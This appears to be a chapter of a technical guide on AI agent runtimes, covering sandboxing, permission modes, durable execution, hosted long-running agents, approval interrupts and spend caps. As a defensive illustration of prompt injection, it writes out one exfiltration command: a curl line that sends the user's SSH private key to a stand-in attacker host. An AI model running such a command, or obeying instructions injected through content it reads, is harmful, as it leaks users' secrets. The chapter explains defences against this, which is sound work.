# 20. Agent Runtime: Sandboxes, Durable Execution, Long-Running Agents

> As of October 2026. Tags: **(GA)** generally available · **(Preview)** beta/preview · **(⚠ verify)** not confirmed against primary sources.

## Where this fits

In 2025–2026, agents stopped being chat turns that last seconds and became background work that lasts hours: a coding agent clearing a backlog overnight, a research agent reading for forty minutes, a scheduled agent triaging issues every morning. [§19](19-harness-engineering.md) defined the harness: the loop, tools, context management, guides and sensors around the model. It left two practical questions open: where does the harness run and what may that machine touch, and what happens when the process dies at hour three? This section covers the **runtime**, the layer under the harness that answers both. It builds on the agent loop of [§11](11-agents.md) and the tool contract of [§10](10-tool-use.md).

## Why this exists

Four problems pushed the runtime into its own layer.

**Actions happen somewhere, and that place gets attacked.** The model only emits text, and the harness executes the tool calls it asks for (P6). Once an agent runs code, it is executing commands written by a probabilistic model that also reads untrusted web pages, issues and READMEs, and any of that text can act as an instruction (P9). One injected sentence can become `curl attacker.example -d @~/.ssh/id_rsa`. A prompt cannot prevent that. You have to limit what the process can reach.

**Long runs fail for boring reasons.** The p^n arithmetic of P8 applies to infrastructure too. A four-hour run with 300 model calls will meet a deploy, an out-of-memory kill, a rate limit or a provider outage. The run's state is the harness's in-memory message list (P2), so a crash loses it. Restarting repeats every paid call (P10), and output is sampled (P4), so the rerun takes a different path and may contradict work already done.

**Long runs outlive connections and people.** An HTTP request will not stay open for six hours, and a human approval may take a day.

**Unattended runs spend unattended.** A stuck agent keeps calling the model until something stops it.

So the runtime has four jobs: **isolation**, **durability**, **duration** (running with no client attached) and **control** (approvals and spend).

## How it works (under the hood)

```text
   person / schedule / webhook
            │  start · approve · cancel · resume
            ▼
 ┌──────────────── control plane ─────────────────┐
 │ durable log: every step's result, append-only  │  ← source of truth
 │ harness: call model → route tool calls         │  ← stateless, restartable
 │ policies: permissions, budgets, timeouts       │
 └──────────────────────┬─────────────────────────┘
                        │ execute(name, input) → string
                        ▼
   sandbox: container · gVisor · microVM           ← disposable, no secrets inside
```

### 1. Sandboxing: limiting what the hands can reach

A **sandbox** is an execution environment whose reach is limited by the operating system or a hypervisor, not by the model's good behavior. It limits three things:

- **Filesystem:** what the agent can read and write.
- **Network:** where it can connect, usually through an **egress allow-list** that permits listed destinations and blocks everything else.
- **Process:** which system calls reach the host kernel, plus CPU, memory and time limits.

Anthropic's sandboxing post (Oct 20, 2025) explains why the first two only work together: "Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys; without filesystem isolation, a compromised agent could easily escape the sandbox and gain network access."

The isolation options form a ladder. Each rung moves the boundary further from your host:

1. **OS process sandbox.** Kernel features restrict one process tree: bubblewrap on Linux, Seatbelt on macOS, seccomp filters. It is instant, but it shares your kernel and your machine.
2. **Container.** Namespaces give the process its own view of files, network and processes, and cgroups cap its resources. It still shares the host kernel, so a kernel bug becomes an escape.
3. **gVisor.** A user-space "application kernel" written in Go that intercepts the container's system calls and implements them itself. Its docs call it "seccomp on steroids". It runs as the OCI runtime `runsc`, so Docker and Kubernetes use it unchanged, at the cost of extra overhead on every system call.
4. **microVM.** Firecracker, the open-source technology under AWS Lambda, uses KVM to boot a minimal VM with its own guest kernel and only five emulated devices. It boots fast and is small enough to pack thousands onto one host. Hosted sandbox services such as E2B give agents on-demand Linux VMs.

Here is the container rung written out as flags:

```bash
# Throwaway, locked-down run of one agent command. runsc = gVisor kernel boundary.
docker run --rm --runtime=runsc \
  --network none \
  --read-only --tmpfs /tmp \
  -v "$PWD/workspace:/workspace:rw" -w /workspace \
  --cap-drop ALL --security-opt no-new-privileges \
  --memory 2g --cpus 2 --pids-limit 256 \
  agent-tools:latest pytest -q
```

`--network none` is the bluntest egress policy. Real agents need package registries and APIs, so you usually send their traffic through an allow-list proxy instead.

**Claude Code's approach** is rung 1 plus a proxy. Bubblewrap or Seatbelt confines every command and every subprocess it spawns. The agent can write only inside the working directory. The only network path is a Unix socket to a proxy *outside* the sandbox, which checks each domain against your allow-list and asks you about new ones. Anthropic reported that this cut permission prompts by 84% internally, and it open-sourced the runtime as a research preview **(Preview)**. Read the docs' caveats too. The sandbox wraps shell commands only, while built-in file tools follow permission rules. Hooks and local MCP servers run with your full access. And if the sandbox cannot start, commands run unsandboxed unless `sandbox.failIfUnavailable` is set.

**Keep secrets outside.** Claude Code on the web runs each session in a cloud sandbox with no git credentials inside. A proxy checks a scoped credential and the target branch, then attaches the real token. Assume that anything the agent's code can read, an injection can read too.

### 2. Permissions, approvals and allow-lists

The sandbox decides *where* actions can land. **Permission modes** decide *which actions need a human first*. Claude Code's modes run from `plan` (explore only) and `default` (ask on first use of each tool), through `acceptEdits` and `auto` (a classifier reviews actions instead of you), to `dontAsk` (deny anything not pre-approved) and `bypassPermissions` ("only in isolated environments like containers or VMs"). Rules are `allow`, `ask` and `deny` lists, and the docs state plainly: "Permission rules are enforced by Claude Code, not by the model." Claude Managed Agents sets the same dial per tool with `always_allow`, `always_ask` or `auto` **(Preview)**.

Two rules follow. **Prefer allow-lists to deny-lists**, because you can list what a task needs but not everything dangerous. And **use the sandbox to cut down prompts**: constant prompts breed approval fatigue, where people stop reading and click yes. One boundary decision replaces a hundred per-action ones.

### 3. Durable execution: persist each step, replay on crash

With **durable execution**, the runtime writes each step's result to durable storage. After a crash it re-runs your orchestration code from the top. Completed steps return their recorded results instantly, and the first unrecorded step is where real work resumes.

You know this pattern from data engineering: a streaming job commits offsets so a restart doesn't reprocess the topic. You also know its catch. The step executes its side effect first and records it second. If the process dies between the two, the step runs again on restart. Temporal's docs say the same: Activities "won't record to the Event History until they return or produce an error", and unreported ones are retried. So durable execution is **at-least-once** per step. You get **effectively-once** the way pipelines do. Make each side effect **idempotent**, so doing it twice equals doing it once, by passing an **idempotency key** derived from the run and step ID to every external write. It is the agent's version of a `MERGE` upsert.

```python
import json, os, pathlib
import anthropic

client = anthropic.Anthropic(api_key=os.environ["ANTHROPIC_API_KEY"])
LOG = pathlib.Path("run-42.jsonl")            # one run = one append-only step log

def load_log() -> dict:
    if not LOG.exists():
        return {}
    rows = [json.loads(line) for line in LOG.read_text().splitlines() if line]
    return {r["step"]: r["result"] for r in rows}

DONE = load_log()                             # results of steps finished before a crash

def step(step_id: str, fn, *args):
    if step_id in DONE:                       # replay: hand back the recorded result,
        return DONE[step_id]                  # never re-call the model or the tool
    result = fn(*args)                        # first time: really execute the side effect
    with LOG.open("a") as f:                  # a crash before this write re-runs the step,
        f.write(json.dumps({"step": step_id, "result": result}) + "\n")
        f.flush(); os.fsync(f.fileno())       # which is why tools must be idempotent
    DONE[step_id] = result
    return result

def ask_model(prompt: str) -> str:
    msg = client.messages.create(model="claude-sonnet-5-5", max_tokens=2048,
                                 messages=[{"role": "user", "content": prompt}])
    return "".join(b.text for b in msg.content if b.type == "text")

def open_ticket(title: str, idempotency_key: str) -> str:
    # A real tool sends idempotency_key to the ticket API so a retry can't duplicate.
    return f"TICKET-{idempotency_key}"

def run(task: str) -> str:
    title = step("1-title", ask_model, f"One-line ticket title for: {task}")
    ticket = step("2-ticket", open_ticket, title, "run42-step2")   # key from run + step
    return step("3-reply", ask_model, f"Tell the user {ticket} was opened: {title}")

print(run("Nightly dbt job fails on the orders model"))
```

Kill the process after step 2 and restart it. Steps 1 and 2 come from the log, with no model call and no second ticket, and step 3 runs for real.

**The determinism rule.** Replay works only if the orchestration code makes the same decisions given the same step results. Code between steps must not read the clock, draw random numbers or do I/O directly; those become steps too. Step IDs come from the code path, such as `f"model-{turn}"`, never from a timestamp. The model's randomness is fine because each call is a step, so replay returns the recorded sample. Temporal's Nov 2025 post calls an agent "Deterministic in execution" but "NOT predetermined": the model still picks the path, and the log remembers its picks. Two consequences follow. Deploying new orchestration code while runs are in flight can break replay, which is why durable engines offer versioning. And durability is not chat storage: Pydantic AI's docs note that "A durable engine keeps one run alive across crashes and restarts. It does not store your chat threads" (that is [§17](17-memory.md)'s job).

**Checkpoints vs journals.** A **checkpoint** saves a snapshot of the whole state after each step, like a periodically materialized table. LangGraph's checkpointers do this per `thread_id`, with in-memory, SQLite or Postgres savers, and they also enable time travel. A **journal** records every step's result, like a change log, and rebuilds the state by replay (Temporal, Restate, Inngest, DBOS). Checkpoints have a sharp edge. After an interrupt, LangGraph "restarts from the beginning of the node", so code before the interrupt runs again and must be idempotent.

### 4. The engines, briefly

| Engine | Shape | Notes |
|---|---|---|
| **Temporal** | Server + workers. Deterministic Workflows call Activities (LLM calls, tools) | Event History is the journal. Temporal's blog (Nov 12, 2025, a vendor claim) says OpenAI's Codex web agent and Replit Agent 3 run on it. OpenAI Agents SDK integration GA on Mar 23, 2026, per Temporal **(GA)** |
| **Restate** | A single binary, log-centric | Journals every step and "treats the replicated log as ground truth". Built-in idempotency keys |
| **Inngest** | Event-driven functions built from `step.run(...)` | "saves its result, and retries failed work from the step that failed". Also offers microVM sandboxes |
| **DBOS** | A library, not a server | Checkpoints workflows and steps into your Postgres |
| **LangGraph** | Graph runtime + checkpointers | `interrupt()` / `Command(resume=...)` for HITL ([§14](14-graph-engineering.md)) |

Pydantic AI has adapters for Temporal, DBOS, Prefect, Restate and others. Each one wraps every model request and tool call as a durable step, the snippet above done for you.

### 5. Background and long-running agents

Long work uses the async job pattern you know from submitting a Spark job: **submit → get an ID → poll or get called back → fetch the result.**

**OpenAI background mode.** You send a Responses API request with `background: true` and get an ID back immediately. You poll `GET /v1/responses/{id}` while the status is `queued` or `in_progress`. You can cancel ("Cancelling twice is idempotent"). You can also resume a dropped stream from the last event's `sequence_number`. Under Zero Data Retention, background data is kept only about 10 minutes for polling. **Webhooks** remove the polling: they follow the Standard Webhooks spec and push events such as `response.completed`, which you verify by signature before fetching the result. On the Anthropic side, the asynchronous surfaces are the Message Batches API (submit, then fetch results by ID) and Managed Agents sessions.

**Hosted runtimes.** By 2026 both labs sell the runtime itself:

- **Claude Managed Agents** **(Preview)**. Header `managed-agents-2026-04-01`. You define a versioned *agent*, an *environment* (the sandbox) and *sessions*. A session moves through `idle`, `running`, `rescheduling` and `terminated`, sends webhooks, and can be fired on a cron schedule by a *deployment*.
- **OpenAI's Agents API** **(Preview)**. It "gives your application access to the Codex harness through an OpenAI-managed API", with agent, environment, session and events.

The two vendors converged on nearly the same nouns. That is a sign these are the natural seams.

**Cloud and scheduled agents.** Claude Code on the web and Codex cloud run coding sessions on vendor machines while your laptop is off. Claude Code routines **(Preview)** fire a saved prompt, repos and connectors on a schedule, from an HTTP endpoint or on GitHub events. Cloud schedules run at most hourly, and each run starts from a fresh clone. With no memory between runs, everything a run needs must live in the repo or a memory store.

### 6. Human-in-the-loop as a durable interrupt

With durable execution, an approval is a step whose result comes from a person. The runtime records a pending request, saves state and releases compute, so nothing runs or bills while you wait. When the answer arrives as an event, the run replays to that point and continues. LangGraph's interrupt "waits indefinitely until you resume". In Managed Agents, an `always_ask` tool leaves the session `idle` with `requires_action` until a `user.tool_confirmation` event arrives. Building on the executor above (`apply_plan` is your tool):

```python
APPROVALS = pathlib.Path("approvals.json")   # written by your UI or Slack button

class Suspended(Exception):
    """Stop the process. The run's state is already in the step log."""

def wait_for_human(step_id: str, question: str) -> bool:
    answers = json.loads(APPROVALS.read_text()) if APPROVALS.exists() else {}
    if step_id not in answers:               # no answer yet: surface the request, exit
        print(f"PENDING {step_id}: {question}")
        raise Suspended(step_id)             # nothing is logged, so this step re-asks
    return answers[step_id]                  # the answer becomes the step's result

def run_with_approval(task: str) -> str:
    plan = step("1-plan", ask_model, f"Plan a fix for: {task}")
    ok = step("2-approve", wait_for_human, "2-approve", f"Apply this plan?\n{plan}")
    if not ok:
        return "rejected by a human"
    return step("3-apply", apply_plan, plan, "run42-step3")
```

When the answer is written, re-trigger the run. Step 1 replays without a model call, step 2 records the answer and step 3 executes, whether the wait lasted a minute or a month.

### 7. Managed Agents: session, harness, sandbox

Anthropic's "Scaling Managed Agents" (Apr 8, 2026) is the clearest public design of a production agent runtime. It splits an agent into three parts with narrow interfaces:

- **Session:** "the append-only log of everything that happened".
- **Harness:** "the loop that calls Claude and routes Claude's tool calls to the relevant infrastructure".
- **Sandbox:** "an execution environment where Claude can run code and edit files".

All three started in one container, which made the container a **pet**: a hand-tended server you can't afford to lose. When it died, the session died. Decoupling turned both the harness and the sandbox into **cattle**, interchangeable units you replace instead of repair:

- **The sandbox is just a tool.** The harness calls it as `execute(name, input) → string`. If the container dies, Claude sees a tool error, and a retry gets a fresh container via `provision({resources})`.
- **The harness is stateless.** It writes every event with `emitEvent(id, event)`. After a crash, a new harness calls `wake(sessionId)`, reads the log via `getSession(id)` and resumes from the last event.
- **Credentials never enter the sandbox.** Git tokens are wired in during setup, and MCP calls go through a proxy that pulls OAuth tokens from a vault.
- **Sandboxes start only when needed.** Inference no longer waits for a container to boot. The post reports p50 time-to-first-token down about 60% and p95 down over 90%.

The data-engineering reading is direct: **the log is the source of truth, and the context window is a view derived from it.** "The session is not Claude's context window." Compaction, trimming and the rest of [§16](16-context-engineering.md) become transformations the harness applies when it reads slices of the log with `getEvents()`, not destructive edits to the only copy. It is the same move as keeping an immutable Kafka log and rebuilding tables from it. You can change the views as models improve without touching the storage. The post's own P12 example: context resets added for Sonnet 4.5's "context anxiety" became "dead weight" on Opus 4.5. The interfaces stayed; the harness changed.

### 8. Spend controls at runtime

| Layer | Example | Kind |
|---|---|---|
| Per response | `max_tokens` | Hard |
| Per task | Anthropic task budgets: a token budget the model sees and paces against **(Preview)** | Advisory |
| Per run | Claude Code `--max-turns`, `--max-budget-usd` (print mode); Managed Agents session budget in list-price US cents **(Preview)** | Hard |
| Org and compute | Workspace spend limits; sandbox idle and lifetime timeouts | Hard |

A Managed Agents budget is "enforced between model requests, so the request that crosses it finishes first". At the cap, the session pauses in `idle` with `budget_reached` instead of terminating, and changing the budget resumes it. Advisory budgets let the model wrap up gracefully; hard caps protect you. Durable execution adds one rule: **keep the spend counter in the durable log, not in process memory**, or every crash resets the budget.

### Failure modes

- **Non-deterministic orchestration**: a `now()` or `random` between steps makes replay diverge.
- **Non-idempotent tools in the crash window**: duplicate tickets, double charges, two PRs.
- **Deploys mid-run** break replay unless the workflow is versioned.
- **Secrets inside the sandbox** are one injection away from leaking.
- **Silent fallback to unsandboxed** execution when the sandbox fails to start.
- **Unbounded state**: LangGraph warns of "Checkpoints growing unboundedly".
- **Orphaned sessions and sandboxes** keep billing.
- **Approval fatigue** turns every prompt into a rubber stamp.

## Comparison

**Isolation options**

| Option | Boundary | Strength | Weakness | Choose when |
|---|---|---|---|---|
| OS process sandbox | Kernel restrictions on one process tree | Instant, works on a laptop | Shares your kernel and machine | Local coding agents with a domain allow-list |
| Container | Namespaces + cgroups | Familiar, reproducible images | Shared host kernel | Trusted code, CI-style tool runs |
| gVisor | User-space kernel intercepts syscalls | Little host-kernel exposure, container tooling | Syscall overhead, some incompatibilities | Multi-tenant platforms running untrusted code |
| microVM (Firecracker) | Hardware virtualization, own guest kernel | Strongest common boundary, fast boot | More infrastructure to run | Hosted sandboxes for arbitrary code |

**Durability approaches**

| Approach | How it works | Strength | Weakness | Choose when |
|---|---|---|---|---|
| None | State lives in the process | Simplest | A crash loses everything; reruns diverge | Runs of seconds |
| Checkpointer (LangGraph) | Snapshot state after each step | Resume, HITL, time travel | Partial nodes re-run; snapshots grow | Graph-shaped agents, chat threads |
| Workflow engine (Temporal, Restate, Inngest) | Journal every step, replay on recovery | Exact replay, timers, signals, retries | Determinism rules, versioning, another system | Hours-long or business-critical runs |
| Library on your DB (DBOS) | Checkpoints in your Postgres | No new server | Tied to Postgres | Teams already strong on Postgres |
| Hosted session (Managed Agents, OpenAI Agents API) | Vendor runs log, harness and sandbox | No infrastructure, built-in sandboxes and webhooks | Lock-in, preview APIs | You want the runtime as a service |

## What it didn't solve

The runtime keeps one agent alive: isolated, resumable, budgeted and able to wait days for an approval. But a human still decides what it should do next, prompts it, reads what came back, judges whether it is done and prompts it again. Every run ends at a person, so human attention is now the slowest part of the system. The next step is to automate the prompting itself.
→ Next: [§21 Loop Engineering](21-loop-engineering.md)

## Check your understanding

**Q: Why does an agent that runs code need filesystem and network isolation together, rather than either alone?**

Filesystem limits stop an injected agent from reading or changing files outside its area, and network limits stop it from sending data anywhere. With only one, the other becomes the hole: data inside the allowed paths gets posted to any host, or the agent edits configs to regain the network access you blocked. Together they cap the damage of an injection without trusting the model (P9). The cost is maintaining allow-lists for the registries and APIs real tasks need.

**Q: In durable execution, why must workflow code be deterministic when the LLM calls inside it are not?**

Recovery re-runs the code and feeds each step its recorded result, so the code must take the same branches and produce the same step IDs. LLM calls may be random because they are steps, and replay returns the logged sample, not a new one (P4). A clock read or random number outside a step can send replay down a branch that never happened. That discipline is not worth it for short runs that can simply restart.

**Q: What would happen if a tool that charges a customer crashed after the charge succeeded but before its result was logged?**

Engines record a step only after it returns, so the step re-runs on restart and the customer is charged twice: durable execution is at-least-once. An idempotency key built from the run and step ID lets the payment API drop the duplicate, which makes the charge effectively-once. If the API has no such key, check for an existing charge before writing, or gate the step behind a human.

**Q: Checkpointer vs step journal: what does each persist, and when is each the better fit?**

A checkpointer snapshots the whole state after each step. A journal records every step's result and rebuilds the state by replaying them. Checkpoints are simpler and give resume and time travel, but a half-finished node re-runs. Journals replay side effects exactly and add durable timers, at the cost of determinism rules and another system. Use checkpoints for graph agents and chat threads, and journals for long runs with external side effects.

**Q: Why does Managed Agents keep the session log separate from Claude's context window?**

The log stores every event durably outside the harness, and the context window is only the slice the harness shows Claude next. So compaction becomes a reversible view: the originals can be re-read with `getEvents()` later. It also makes the harness stateless, because a replacement reads the log and resumes. For a one-call task the extra layer buys nothing.

**Q: How can a human approval that takes three days cost nothing while it waits?**

The approval is a step whose result comes from a person. The runtime saves state, records the pending request and releases the process and sandbox. When the answer arrives as an event, the run replays its finished steps from the log, with no repeated model calls, and continues. Code before the interrupt must be safe to run again.

**Q: What would happen to a spend cap tracked in process memory when the run crashes and replays?**

The counter restarts at zero while recorded steps replay at no new cost, so every restart grants a fresh budget, and a crash-looping agent can spend many times its cap. Record each step's cost in the durable log so the total is rebuilt on replay, or enforce the cap outside the process, as Managed Agents session budgets do.

## Takeaways

- The runtime answers four questions: what the agent can touch, how it survives crashes, how it runs with no one connected, and what stops it.
- Sandbox both the filesystem and the network, keep secrets outside, and prefer allow-lists; prompts cannot enforce security (P9).
- Durable execution means logging each step's result and replaying it after a crash. That is at-least-once, so tools need idempotency keys to become effectively-once.
- Orchestration code must be deterministic. The model may be random because its samples are recorded inside steps.
- Human approval is a durable interrupt: save state, release compute, resume on an event.
- Managed Agents splits the session (append-only log), the harness (stateless cattle) and the sandbox (a replaceable tool). The log is the truth, and the context window is a view of it.
- Every unattended run needs a hard spend cap whose counter lives in the durable log.

## Sources

- Anthropic, "Beyond permission prompts: making Claude Code more secure and autonomous" (Oct 20, 2025): https://www.anthropic.com/engineering/claude-code-sandboxing
- Claude Code docs, Sandboxing: https://code.claude.com/docs/en/sandboxing
- Claude Code docs, Permissions and permission modes: https://code.claude.com/docs/en/permissions
- Claude Code docs, CLI reference: https://code.claude.com/docs/en/cli-reference
- Claude Code docs, Routines: https://code.claude.com/docs/en/routines
- Anthropic, "Scaling Managed Agents: Decoupling the brain from the hands" (Apr 8, 2026): https://www.anthropic.com/engineering/managed-agents
- Claude Managed Agents docs, Overview: https://platform.claude.com/docs/en/managed-agents/overview
- Claude Managed Agents docs, Sessions (budgets): https://platform.claude.com/docs/en/managed-agents/sessions
- Claude Managed Agents docs, Permission policies: https://platform.claude.com/docs/en/managed-agents/permission-policies
- gVisor docs: https://gvisor.dev/docs/
- Firecracker: https://firecracker-microvm.github.io/
- E2B docs: https://e2b.dev/docs
- Temporal docs, Workflow Definition: https://docs.temporal.io/workflow-definition
- Temporal docs, Activity Definition: https://docs.temporal.io/activity-definition
- Temporal blog, "Of course you can build dynamic AI agents with Temporal" (Nov 12, 2025): https://temporal.io/blog/of-course-you-can-build-dynamic-ai-agents-with-temporal
- Temporal blog, "Production-ready agents with the OpenAI Agents SDK + Temporal" (Jul 30, 2025; GA update Mar 23, 2026): https://temporal.io/blog/announcing-openai-agents-sdk-integration
- Restate docs, Durable Execution: https://docs.restate.dev/concepts/durable_execution
- Restate docs, Architecture: https://docs.restate.dev/references/architecture
- Inngest docs: https://www.inngest.com/docs
- DBOS docs, Architecture: https://docs.dbos.dev/architecture
- LangGraph docs, Persistence: https://docs.langchain.com/oss/python/langgraph/persistence
- LangGraph docs, Interrupts: https://docs.langchain.com/oss/python/langgraph/interrupts
- Pydantic AI docs, Durable Execution: https://ai.pydantic.dev/durable_execution/overview/
- OpenAI docs, Background mode: https://developers.openai.com/api/docs/guides/background
- OpenAI docs, Webhooks: https://developers.openai.com/api/docs/guides/webhooks
- OpenAI docs, Agents API: https://developers.openai.com/api/docs/guides/agents-api/overview
